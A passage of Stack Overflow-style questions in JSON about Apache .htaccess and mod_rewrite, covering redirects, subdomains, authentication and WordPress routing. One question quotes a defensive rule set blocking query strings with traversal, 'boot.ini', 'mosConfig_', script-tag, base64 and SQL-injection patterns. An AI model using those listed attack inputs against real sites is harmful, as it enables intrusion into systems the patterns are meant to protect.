close`\n`Content-Type =&gt; text/html`\n</code></pre>\n\n<p>Google has now spidered the website and it now looks like there are two sites with duplicate content. Google.co.uk has also said they won't do anything about this site unless I get a court order. </p>\n\n<p>Any ideas how I can block 302 redirects to my site?</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":660,"score":1,"question_id":9261384,"title":"redirecting files with html extension to files without extension (in url)","body":"<p>I have recently changed my website url using htaccess so that my urls will not show file extensions. Now my problem is as I have created a new xml sitemap so that my url will be extensionless!!! the Google webmaster tool is telling me about duplicate content issue!! ie. page and page.html have same title.... so my question is how do i redirect the urls with file extension html to urls with out extension!!! \nthis is an example of my website url with html extension</p>\n\n<p><a href=\"http://www.shenazhpeyk.co.uk/Cap%20Coder.html\" rel=\"nofollow\">http://www.shenazhpeyk.co.uk/Cap%20Coder.html</a></p>\n\n<p>I want to redirect and change it to </p>\n\n<p><a href=\"http://www.shenazhpeyk.co.uk/Cap%20Coder\" rel=\"nofollow\">http://www.shenazhpeyk.co.uk/Cap%20Coder</a></p>\n\n<p>so that will fix the issue with google webmaster tools (Please provide me a code for use in htaccess file)</p>\n\n<p>Many Thanks</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","apache2","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12484814,"title":"\"OR\" Flag in .htaccess mod_rewrite","body":"<p>Just found this .htaccess rewrite code</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{HTTP_HOST} ^my.domain.com$ [NC,OR]\nRewriteCond %{REQUEST_URI} !public/\nRewriteRule (.*) /public/$1 [L]\n</code></pre>\n\n<p>And I was wondering what was the purpose of the \"OR\" flag.\nAlready checked the doc <a href=\"http://httpd.apache.org/docs/2.2/mod/mod_rewrite.html#rewriteflags\" rel=\"nofollow\">http://httpd.apache.org/docs/2.2/mod/mod_rewrite.html#rewriteflags</a> but coulnd find any infos.</p>\n\n<p>Any ideas?</p>\n"},{"tags":["php","apache",".htaccess","url","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12550556,"title":"htaccess url having slashes not matched","body":"<p>I have the following configuration in .htaccess file:</p>\n\n<pre><code>Options -Multiviews -Indexes +FollowSymLinks\nRewriteEngine on\nRewriteBase /coaster/CoasterInsider/\nRewriteRule searchResults/keyword/(.*)/?$ index.php?page=searchResults&amp;keyword=$1 [L,NC]\nRewriteRule searchResults/keyword/(.*)/start/(.*)/?$ index.php?page=searchResults&amp;keyword=$1&amp;start=$2 [L,NC]\n</code></pre>\n\n<p>But <code>start=$2</code> is not matching. example:\nurl is: <code>localhost/coaster/CoasterInsider/searchResults/keyword/a/start/3/</code>\nBut when I try to <code>echo $_GET['keyword']</code> that's printing <code>a/start/3/</code> and start is not getting any value.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":4,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":119,"score":1,"question_id":8464206,"title":"Rewriting every URL to index.php using .htaccess","body":"<p>I'm trying to catch every URL and rewrite it to index.php. I have the following code in my .htaccess right now:</p>\n\n<pre><code>RewriteEngine on\nRewriteRule .* index.php\n</code></pre>\n\n<p>It does rewrite every URL, but I always get a 404 saying the index.php file cannot be found. The path it is looking for the file is correct though. What am I doing wrong here?</p>\n\n<hr>\n\n<p><strong>Update 1</strong></p>\n\n<p>When I directly browse to index.php, it does correctly display the file. Very strange.</p>\n\n<hr>\n\n<p><strong>Update 2</strong></p>\n\n<p>I turned on logging for mod_rewrite using this in httpd.conf:</p>\n\n<pre><code>RewriteLog /var/log/apache2/rewrite.log\nRewriteLevel 3\n</code></pre>\n\n<p>This is what it logged:</p>\n\n<pre><code>strip per-dir prefix: /Users/rits/Sites/test/ -&gt; \napplying pattern '.*' to uri ''\nrewrite '' -&gt; 'index.php'\nadd per-dir prefix: index.php -&gt; /Users/rits/Sites/test/index.php\ninternal redirect with /Users/rits/Sites/test/index.php [INTERNAL REDIRECT]\n</code></pre>\n"},{"tags":["apache",".htaccess","mod-rewrite","redirect","cpanel"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12532128,"title":".htaccess or cPanel redirects. Redirect pagename in folder to subdomain/pagename (all folder contents)","body":"<p>I am trying to get a redirect set up for my site. I have three <strong>subdomains</strong> which I use</p>\n\n<p>1) (www.)mysite.com</p>\n\n<p>2) sub.mysite.com </p>\n\n<p>3) anothersub.mysite.com</p>\n\n<p>I initially didn't use subdomains and had all my pages in a <code>www.mysite.com/*.php</code> format.</p>\n\n<p>I am trying to add a redirect to make all the pages under the <code>/myfolder/</code> folder redirect to <code>sub.mysite.Com/</code> (NB sub is the same name on my site as the myfolder folder) </p>\n\n<p>I have tried setting up a redirect through cPanel but all the combinations have resulted in 404 errors when I try them. I have also tried various things in <code>.htaccess</code> which resulted in many 404 errors.</p>\n\n<p>I added a simple redirect in cPanel and get the following</p>\n\n<p>e.g. </p>\n\n<pre><code>www.mysite.com/myfolder/myfolder_mypagename.php\n</code></pre>\n\n<p>should redirect to </p>\n\n<pre><code>sub.mysite.Com/myfolder_mypagename.php\n</code></pre>\n\n<p>but instead it redirects to</p>\n\n<p><code>sub.mysite.com/_mypagename.php</code> (missing out the \"myfolder\" part of the pagename)</p>\n\n<p>Can you assist me in this please? It's driving me bonkers and my hosting company said it wasn't possible (which I find hard to believe!)</p>\n"},{"tags":[".htaccess","mod-rewrite","bluehost"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12415896,"title":"Redirecting Subdirectory to Subdomain with htaccess","body":"<p>I'm relatively new to using .htaccess, and have never done any coding besides what I've read online.  I'm using Bluehost, and I'd like to redirect my blog subdirectory to a subdomain.  Example: I'd like to redirect www.example.com/blog to blog.example.com.</p>\n\n<p>I already have code in place to always add www. to the beginning of my blog address in the root folder, but I don't know how to accomplish the above redirect by using code in .htaccess.  Any help would be appreciated!</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","url-rewriting"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":77,"score":1,"question_id":12545746,"title":"Rewritten URL without id, or rewrite title by passed id","body":"<p>My actual url looks like this:</p>\n\n<pre><code>http://mydomain.com/example.php?id=value1&amp;name=value2\n</code></pre>\n\n<p>Ideal for me would be something like:</p>\n\n<pre><code>http://mydomain.com/example/value2\n</code></pre>\n\n<p>I dont want to show the items id. I googled for hours but didn`t find anything usefull.\nI want to pass the id along but dont want to show it in URL. Is something like this possible?\nCould i maybe rewrite the url somehow after client loaded the page?</p>\n\n<p>If i must send the id then how could i rewrite the name value, accodring to id?\nSo if i type something not related to item with specified id in the name field, on response i sitll get the actual value for name associated to id.\nSo this is what i mean:</p>\n\n<ul>\n<li>the actual ulr is: <code>http://mydomain.com/example/123</code></li>\n<li>what i type: <code>http://mydomain.com/randomtext/123</code></li>\n<li>and i still get the response: <code>http://mydomain.com/example/123</code></li>\n</ul>\n\n<p>Just like here: <a href=\"http://www.theatlantic.com/magazine/archive/1939/03/what-makes-an-american/309021/\" rel=\"nofollow\">http://www.theatlantic.com/magazine/archive/1939/03/what-makes-an-american/309021/</a>\nIf you change <code>what-makes-an-american</code> to any random text, you still get to the same page.\nDo they use redirect? Isn`t that harmfull to loadtime?</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":12547335,"title":"redirect subdirectory request only if request not from my domain","body":"<p>I wish to redirect a subdirectory/anyfile.pdf request from an outside domain to mydomain/index only if the request not from my domain.</p>\n\n<p>I have many pdf files in subdirectory. I want to prevent direct downloads of those pdf files from outside domains.  However if the request comes from any page in mydomain/index I want the download to go through.</p>\n"},{"tags":["php",".htaccess","localhost","http-status-code-404"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12548143,"title":"create a personalized 404 error page in php in localhost","body":"<p>I want to create a personalized <code>404 error page</code> in php , I want to it works in localhost, as you know the localhost does not have .htaccess file !</p>\n"},{"tags":[".htaccess","htpasswd"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":152,"score":3,"question_id":9675208,"title":"Whitelisting IPs with .htaccess / .htpasswd","body":"<p>Using the following <code>.htaccess</code>, I am able to successfully limit access to users with the correct username/password and users from a specific IP address:</p>\n\n<pre><code>AuthType Basic\nAuthName \"Please enter your password\"\nAuthUserFile /path/to/.htpasswd\n\nRequire valid-user\nOrder deny,allow\nDeny from all\n\nAllow from 123.123.123.123\nSatisfy Any\n</code></pre>\n\n<p>This works on a number of different servers, however, today I came across a server where this <em>doesn't</em> work 100%.  Users with the correct username/password <em>can</em> login, but users from the specified IP <em>are not</em> allowed and are forced to enter a password.</p>\n\n<p>Is there something in <code>httpd.conf</code> that might be preventing the IP whitelist from working?  I've tried a number of variations and continue to get the same result.  All servers are Apache on Linux.</p>\n"},{"tags":[".htaccess","subdomain","folder","virtualhost","subfolder"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":79,"score":0,"question_id":12542329,"title":".htaccess - Subdomains to folders = subfolders 404","body":"<p>Sorry if the title is confusing.</p>\n\n<p>I have set up a <em>virtual host</em> on my local machine. I've set <code>http://dev</code> to map to my <code>/htdocs/dev</code> folder. With some help from <em>dnsmasq</em> and <em>.htaccess</em>, I've set it up so that it maps subdomains of <code>.dev</code> to folders inside <code>/htdocs/dev</code>. And it all works perfect when I try to access, for example, <code>http://dev/file1.html</code> or <code>http://folder.dev/file2.html</code>. The problem occurs with accessing subfolders. I get a <code>404 Object not found</code> if I try to access <code>http://folder.dev/subfolder/</code> or <code>http://folder.dev/subfolder/file3.html</code>.</p>\n\n<p>I guess it can be solved with .htaccess, but I failed to do it although I tried. Here's how my <code>/htdocs/dev/.htaccess</code> looks like:</p>\n\n<pre><code># Default index file\n  DirectoryIndex index.php\n\n# Interpret .html files as .php scripts\n  AddHandler php5-script .php .html\n\n# Redirect subdomains to their respective folders\n  RewriteEngine on\n  RewriteBase /\n\n  RewriteCond %{HTTP_HOST} !^www\\.dev$ [NC]\n  RewriteCond %{HTTP_HOST} ^(www\\.)?([a-z0-9-]+)\\.dev$ [NC]\n    RewriteRule !^([a-z0-9-]+)($|/) /%2%{REQUEST_URI} [PT,L]\n</code></pre>\n\n<p>I should mention that, if I try to access <code>http://dev/folder/subfolder/file3.html</code>, there are no problems.</p>\n\n<p>How can I set addresses such as <code>http://folder.dev/subfolder/</code> point to <code>/htdocs/dev/folder/subfolder</code>?</p>\n"},{"tags":["php","apache",".htaccess","rewrite"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12547308,"title":".htaccess all request to other file","body":"<p>Currently I have the following .htaccess file</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine on\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n\nRewriteRule ^(.*)$ public/index.php/$1 [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Which works allmost perfect.</p>\n\n<p>It rewerites urls like <a href=\"http://domain.com/something/\" rel=\"nofollow\">http://domain.com/something/</a> to the public/index.php file, like a charm, except when it is a file, just like it should.</p>\n\n<p>However <a href=\"http://domain.com\" rel=\"nofollow\">http://domain.com</a> (without any path appended) (there is no index.php in the root, so it gives a 404 at the moment) is not being rewrited, how can I change this .htaccess so it rewrites this url too?</p>\n\n<p>The index file is in public/index.php I want it to load that file through the use of .htaccess</p>\n\n<p>Thanks</p>\n"},{"tags":[".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":12547011,"title":"Change domain home directory to a subdirectory","body":"<p>I'm want to move the home directory for the main domain on the host to a sub-directory so all the other domains, sub domains are not mixed with the folders from the website on the main domain.</p>\n\n<p>Example on how I would want to have the folders organised on my host:</p>\n\n<p>Current location for main domain: public_html/index.php</p>\n\n<p>New location for main domain: public_html/old_main/index.php</p>\n\n<p>After the changes when accessing the main domain the url should be the same.</p>\n\n<p>I've found these conditions but they mess up all my other domains. The one that I want redirected works just fine. I don't know how to exclude the others.</p>\n\n<pre><code>Options -Indexes\nRewriteEngine on\nOptions +FollowSymLinks\nRewriteCond %{HTTP_HOST} !^www\\.mysite\\.com$ [NC]\nRewriteRule .* http://www.mysite.com/   [L,R=301]\nRewriteRule ^$ drupal/index.php [L]\nRewriteCond %{DOCUMENT_ROOT}/drupal%{REQUEST_URI} -f\nRewriteRule .* drupal/$0 [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule .* drupal/index.php?q=$0 [QSA]\n</code></pre>\n\n<p>Thanks,\nSebastian</p>\n"},{"tags":["php","apache",".htaccess","include","apache2"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1210,"score":1,"question_id":6508429,"title":"How to set the PHP include path via .htaccess?","body":"<p>I want to set the PHP include path to another directory. I tried putting this in an .htaccess file, but that didn't work. The only thing I see is the include path's I set in httpd.conf, but not the one I tried to add.</p>\n\n<pre><code>&lt;IfModule mod_php5.c&gt;\nphp_value include_path \".:/var/www/mywebsite/\"\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>What am I doing wrong?\nI did <code>a2enmod mod_php5</code>, but it was already running, so I suppose PHP5 is already running as Apache module.</p>\n\n<p>[EDIT] In my vhost config I have this:</p>\n\n<pre><code>&lt;Directory ~ \"^/var/www/.*\"&gt;\n        AllowOverride All\n        Options FollowSymLinks -Indexes -MultiViews\n        php_value include_path \".:./include:./.include/:/var/www/.include/:/var/www/\"\n&lt;/Directory&gt;\n</code></pre>\n\n<p>More info (<code>phpinfo()</code>):</p>\n\n<pre><code>Loaded Modules  core mod_log_config mod_logio prefork http_core mod_so mod_alias mod_auth_basic mod_auth_mysql mod_authn_file mod_authz_default mod_authz_groupfile mod_authz_host mod_authz_user mod_autoindex mod_cgi mod_deflate mod_dir mod_env mod_mime mod_negotiation mod_php5 mod_reqtimeout mod_rewrite mod_setenvif mod_status\n\ninclude_path    .:./include:./.include/:/var/www/.include/:/var/www/    .:/usr/share/php:/usr/share/pear\n</code></pre>\n\n<p>Regards,\nKevin</p>\n"},{"tags":["php",".htaccess","http-post"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":184,"score":1,"question_id":9990412,"title":"$_POST Empty with .htaccess","body":"<p>I was searching now quite a bit on the internet but can not find any solution.\nI have an .htaccess file, which rewrites my query string into the GET variable.\nThis works absolutely fine.</p>\n\n<p>when it comes to the POST variable, it is the first time I get into this trouble.\nI have used this .htaccess file already a lot of times on different servers, but now one of my client's server doesn't want to work.\nWhen ever I post a form the whole POST variable is empty... I will post my .htaccess file, any help is appreciated.</p>\n\n<pre><code>Options +FollowSymLinks\nOptions +Indexes\nRewriteEngine on\nRewriteBase /\nRewriteRule ^pages.*$ /error/404 [L]\nRewriteRule ^classes.*$ /error/404 [L]\nRewriteRule ^templates.*$ /error/404 [L]\nRewriteRule ^common.*$ /error/404 [L]\n\nRewriteRule ^([A-Za-z0-9-_]+)/?$ /?p=$1&amp;s=index&amp;a=index&amp;n=index&amp;%{QUERY_STRING} [L]\nRewriteRule ^([A-Za-z0-9-_]+)/([A-Za-z0-9-_]+)/?$ /?p=$1&amp;s=$2&amp;a=index&amp;n=index&amp;%{QUERY_STRING} [L]\nRewriteRule ^([A-Za-z0-9-_]+)/([A-Za-z0-9-_]+)/([A-Za-z0-9-_]+)/?$ /?p=$1&amp;s=$2&amp;a=$3&amp;n=index&amp;%{QUERY_STRING} [L]\nRewriteRule ^([A-Za-z0-9-_]+)/([A-Za-z0-9-_]+)/([A-Za-z0-9-_]+)/([A-Za-z0-9-_]+)/?$ /?p=$1&amp;s=$2&amp;a=$3&amp;n=$4&amp;%{QUERY_STRING} [L]\nRewriteRule ^([A-Za-z0-9-_]+)/([A-Za-z0-9-_]+)/([A-Za-z0-9-_]+)/([A-Za-z0-9-_]+)/([A-Za-z0-9-_]+)/?$ /?p=$1&amp;s=$2&amp;a=$3&amp;n=$4&amp;o=$5&amp;%{QUERY_STRING} [L]\n\nErrorDocument 404 /error/404.php\n</code></pre>\n\n<p>the form looks like this</p>\n\n<pre><code>        &lt;div class=\"login\"&gt;\n            &lt;form action=\"/administrator\" method=\"post\"&gt;\n                &lt;table cellspacing=\"0\" cellpadding=\"0\" width=\"100%\"&gt;\n                    &lt;tr&gt;\n                        &lt;td&gt;Username&lt;/td&gt;\n                        &lt;td&gt;&lt;input type=\"text\" name=\"username\" /&gt;&lt;/td&gt;\n                    &lt;/tr&gt;\n                    &lt;tr&gt;\n                        &lt;td&gt;Password&lt;/td&gt;\n                        &lt;td&gt;&lt;input type=\"password\" name=\"passwort\" /&gt;&lt;/td&gt;\n                    &lt;/tr&gt;\n                    &lt;tr&gt;\n                        &lt;td&gt;&amp;nbsp;&lt;/td&gt;\n                        &lt;td&gt;&lt;input type=\"submit\" value=\"Anmelden\" /&gt;&lt;/td&gt;\n                    &lt;/tr&gt;\n                &lt;/table&gt;\n            &lt;/form&gt;\n        &lt;/div&gt;\n</code></pre>\n\n<p>and the login php file like this</p>\n\n<pre><code>&lt;?php\nsession_start();\n\nif( isset($_SESSION['login']) &amp;&amp; $_SESSION['login'] === TRUE ) {\n    header('Location: /administrator');\n    exit;\n}\n\nif ($_SERVER['REQUEST_METHOD'] == 'POST') {\n\n    $username = $_POST['username'];\n    $passwort = $_POST['passwort'];\n\n    $hostname = $_SERVER['HTTP_HOST'];\n    $path     = dirname($_SERVER['PHP_SELF']);\n\n    if ($username == 'xxx' &amp;&amp; $passwort == 'xxx') {\n        $_SESSION['login'] = true;\n        header('Location: /administrator');\n        exit;\n    }\n}\n?&gt;\n</code></pre>\n"},{"tags":["php","wordpress","apache",".htaccess","port"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":119,"score":1,"question_id":12540539,"title":".htaccess redirect to error page if port is not 80","body":"<p>I'm running a <a href=\"http://www.server2go-web.de/\" rel=\"nofollow\">portable server</a> through usb stick. The thing is I also have WAMP installed in my local machine and Apache somehow gets started on windows startup, because of some random reason which I don't recall now and it can't be changed. I want to <strong>prepare</strong> my portable server in situations like this, so closing httpd.exe from process and starting my portable server is not an option. Anyway, because of already active httpd.exe my portable server's WordPress site can only be accessed through localhost:81 - this is a problem as WP site is very dependent on the URL and I don't want to include the url with port on WP database.</p>\n\n<p>Here is what I want to do through .htaccess:</p>\n\n<ul>\n<li>On any path except for error.php file check if not port 80</li>\n<li>If not port 80 redirect to /error.php?code=port</li>\n</ul>\n\n<p>It it possible for it to have priority over WP redirection or URL handling?</p>\n\n<p>In the error.php I provided info on how to manually close httpd.exe and such so my family and friends can access the portable site. It's sort of like a gallery and calender  application for events and other such stuff...</p>\n\n<p>Please help? I'm I can't figure it out at all. I know others may not have apache already running, but I want to prepare for such a situation.</p>\n\n<p>Something like the following, but the following doesn't work.</p>\n\n<pre><code># BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\n    &lt;If \"%{SERVER_PORT} = 80\"&gt;\n    RewriteEngine On\n    RewriteBase /\n    RewriteRule ^index\\.php$ - [L]\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule . /index.php [L]\n    &lt;/If&gt;\n    &lt;Else&gt;\n    RewriteEngine On\n    RewriteRule ^(error.php)($|/) - [L]\n    RewriteRule ^(.*)$ /error.php?code=port [L]\n    &lt;/Else&gt;\n&lt;/IfModule&gt;\n# END WordPress\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12540090,"title":".htaccess causing 403 - how can I fix this?","body":"<p>I have a website where I wrapped phpbb3 inside wordpress.  It works pretty well, although when I added this security recommendation to my .htaccess:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_METHOD} ^(HEAD|TRACE|DELETE|TRACK) [NC]\nRewriteRule ^(.*)$ - [F,L]\nRewriteCond %{QUERY_STRING} \\.\\.\\/ [NC,OR]\nRewriteCond %{QUERY_STRING} boot\\.ini [NC,OR]\nRewriteCond %{QUERY_STRING} tag\\= [NC,OR]\nRewriteCond %{QUERY_STRING} ftp\\:  [NC,OR]\nRewriteCond %{QUERY_STRING} http\\:  [NC,OR]\nRewriteCond %{QUERY_STRING} https\\:  [NC,OR]\nRewriteCond %{QUERY_STRING} (\\&lt;|%3C).*script.*(\\&gt;|%3E) [NC,OR]\nRewriteCond %{QUERY_STRING} mosConfig_[a-zA-Z_]{1,21}(=|%3D) [NC,OR]\nRewriteCond %{QUERY_STRING} base64_encode.*\\(.*\\) [NC,OR]\nRewriteCond %{QUERY_STRING} ^.*(\\[|\\]|\\(|\\)|&lt;|&gt;|ê|\"|;|\\?|\\*|=$).* [NC,OR]\nRewriteCond %{QUERY_STRING} ^.*(&amp;#x22;|&amp;#x27;|&amp;#x3C;|&amp;#x3E;|&amp;#x5C;|&amp;#x7B;|&amp;#x7C;).* [NC,OR]\nRewriteCond %{QUERY_STRING} ^.*(%24&amp;x).* [NC,OR]\nRewriteCond %{QUERY_STRING} ^.*(%0|%A|%B|%C|%D|%E|%F|127\\.0).* [NC,OR]\nRewriteCond %{QUERY_STRING} ^.*(globals|encode|localhost|loopback).* [NC,OR]\nRewriteCond %{QUERY_STRING} ^.*(request|select|insert|union|declare).* [NC]\nRewriteCond %{HTTP_COOKIE} !^.*wordpress_logged_in_.*$\nRewriteRule ^(.*)$ - [F,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>it is causing 403 errors when users try to use the search form on some of the forum pages.  This is the way the search is presented (as an example):</p>\n\n<pre><code>&lt;div class=\"search-box\"&gt;\n&lt;form method=\"post\" id=\"forum-search\" action=\"./search.php?fid[]=5\"&gt;\n&lt;fieldset&gt;\n&lt;input class=\"inputbox search tiny\" type=\"text\" name=\"keywords\" id=\"search_keywords\" size=\"20\" value=\"Search this forum…\" onclick=\"if (this.value == 'Search this forum…') this.value = '';\" onblur=\"if (this.value == '') this.value = 'Search this forum…';\" /&gt;\n&lt;input class=\"button2\" type=\"submit\" value=\"Search\" /&gt;\n&lt;input type=\"hidden\" value=\"5\" name=\"fid[]\" /&gt;\n&lt;/fieldset&gt;\n&lt;/form&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>Comes back as \"forbidden\".  When I take out that section of .htaccess, it works fine.  I know the very basics about .htaccess and can't figure out why that code is causing a 403 on that section of HTML/PHP.</p>\n\n<p>Any ideas would be appreciated...thanks...</p>\n"},{"tags":[".htaccess","mod-rewrite","basic-authentication"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12540012,"title":"user authentication and mod_rewrite","body":"<p>How can I get mod_rewrite and user authentication to work together? I have tried this, but it just gives me a \"No input file specified\" - when I delete the authentication, it works, so I have located the problem, but can't solve it myself.</p>\n\n<pre><code>DirectoryIndex index.html index.php\n\nAuthName \"Something\"\nAuthType Basic\nAuthUserFile /.htpasswd\n\nrequire valid-user\n\n&lt;IfModule mod_rewrite.c&gt;\n\nRewriteEngine On\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-s\n\nRewriteRule ^(.*)$ index.php?url=$1 [PT,L]\n\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Thanks in advance :)</p>\n"},{"tags":["apache",".htaccess","http-status-code-404"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":98,"score":0,"question_id":12540890,"title":"500 Internal Server Error instead of 404 Page Not Found","body":"<p>Any idea why I get internal server errors instead of 404 errors?</p>\n\n<pre><code>ErrorDocument 404 /404.html\n</code></pre>\n\n<p>That's whats in my .htaccess file, so I really don't know why it does that... :/</p>\n\n<p>Also note, this is on a subdomain... On the main domain it works fine, but on subdomains the htaccess file never works...</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":12545104,"title":".htaccess to modify an URL folder","body":"<p>I have a URL of my web page like <strong><code>www.MyWeb.com/country/america/1</code></strong>\nI want to convert it to <strong><code>www.MyWeb.com/america/1</code></strong>, Using <strong><em>.htaccess</em></strong>.</p>\n\n<p>in the url Country is a folder and the \"1\" is a PHP file that the extension .php was previously changed using .htaccess.</p>\n\n<p><strong>How Can i do this ?</strong></p>\n"},{"tags":["php",".htaccess","http","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":46,"score":0,"question_id":12544826,"title":"Process all http request in one file","body":"<p>I want to process all http requests to my website at a single file and then I will redirect or load the page accordingly..</p>\n\n<p>For Eg. mydomain.com, mydomain.com/abc.php, mydomain.com/temp/xyz.php\nRequest to all these files must first go to a common file, lets say to process.php. process.php will process these request and if requested page exists load that or else load some different page according to the request made, but in all case url should remain same as entered by user.</p>\n\n<p>For Eg. in case of facebook.com/harrypanwar, I dont think facebook.com contains any directory with name harrypanwar but it processes this request and loads the data accordingly from database, same thing I am interested in..</p>\n\n<p>Thanks in advance..</p>\n"},{"tags":[".htaccess","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12544285,"title":"htaccess and codeigniter, make a folder accessible","body":"<p>My Codegniter app structure is</p>\n\n<pre><code>- root\n---- application \n---- system\n---- includes\n---- .htaccess\n---- index.php\n</code></pre>\n\n<p>I would make the \"includes\" folder accessible for all,\ninfact actually my folder /includes is inaccesible. Only my index.php is accesseble.\nI would like to make only \"includes\" dir accessible with all subdirectories.</p>\n\n<p>this is my htaccess:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\n\n#Removes access to the system folder by users.\n#Additionally this will allow you to create a System.php controller,\n#previously this would not have been possible.\n#'system' can be replaced if you have renamed your system folder.\nRewriteCond %{REQUEST_URI} ^system.*\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n\n\n#When your application folder isn't in the system folder\n#This snippet prevents user access to the application folder\n#Submitted by: Fabdrol\n#Rename 'application' to your applications folder name.\nRewriteCond %{REQUEST_URI} ^application.*\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n\n#Checks to see if the user is attempting to access a valid file,\n#such as an image or css document, if this isn't true it sends the\n#request to index.php\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?/$1 [L]\n\n\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n    # If we don't have mod_rewrite installed, all 404's\n    # can be sent to index.php, and everything works as normal.\n# Submitted by: ElliotHaughin\n\nErrorDocument 404 /index.php\n\n&lt;/IfModule&gt; \n</code></pre>\n\n<p>Thanks!</p>\n"},{"tags":["php","html","wordpress",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12538023,"title":"Tracing Word Press processes","body":"<p>Before I get bombarded with RTFMs, I did google this, but all I got was tutorials on how to install themes.  </p>\n\n<p>I have to change a link for a friend's website. Normally I would just ssh into the server issue the command <code>vim index.html</code> and change the <code>&lt;a href='this.html'&gt;This&lt;\\a&gt;</code> to\n<code>&lt;a href='that.html'&gt;That&lt;\\a&gt;</code>, but wordpress is really doing my head in. Changing the link in the <code>index.html</code> file has no affect, and furthermore I can tell that there are some differences that lead me to believe that it is not being used at all</p>\n\n<p>So the first thing I looked at is the <code>.htaccess</code> file:</p>\n\n<pre><code>DirectoryIndex index.php index.html\n\n# BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n\n# END WordPress\n</code></pre>\n\n<p>Next I looked at the <code>index.php</code> file:</p>\n\n<pre><code>&lt;?php\n/**\n * Front to the WordPress application. This file doesn't do anything, but loads\n * wp-blog-header.php which does and tells WordPress to load the theme.\n *\n * @package WordPress\n */\n\n/**\n * Tells WordPress to load the WordPress theme and output it.\n *\n * @var bool\n */\ndefine('WP_USE_THEMES', true);\n\n/** Loads the WordPress Environment and Template */\nrequire('./wp-blog-header.php');\n</code></pre>\n\n<p>So next I went to <code>wp-blog-header.php</code> then <code>wp-config.php</code> then I just gave up. </p>\n\n<p>What I want to know is what exactly wordpress templates do. Do they just set up some of the CSS code and make it easier to link to blogs and facebook? What I was looking for was something in the wordpress Dashboard resembling this:</p>\n\n<pre><code>Main Page = index.html\n</code></pre>\n\n<p>But nothing like that exists. There is, under the <code>pages</code> tab a \"home\" page, and that definitely is the \"home page\" I enter, but the html code displayed for it in Wordpress does not match the HTML code when I click \"view page source\". So where exactly is this new code being generated? I need to intercept it somehow and change the 